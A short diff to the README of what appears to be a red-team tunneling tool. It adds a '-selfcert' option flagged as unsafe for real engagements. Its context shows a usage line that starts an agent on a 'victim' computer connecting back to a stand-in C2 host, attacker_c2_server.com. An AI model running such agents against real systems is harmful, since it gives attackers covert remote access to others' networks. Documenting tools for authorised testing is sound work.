@@ -38,6 +38,8 @@
 
 - ./proxy -autocert (Automatically request LetsEncrypt certificates)
 
+- ./proxy -selfcert (DON'T USE THIS ON A REAL ENGAGEMENT)
+
 # Usage
 
  -  ./agent -connect attacker_c2_server.com:11601 (Start the agent on your target (victim) computer (no privileges are required!)
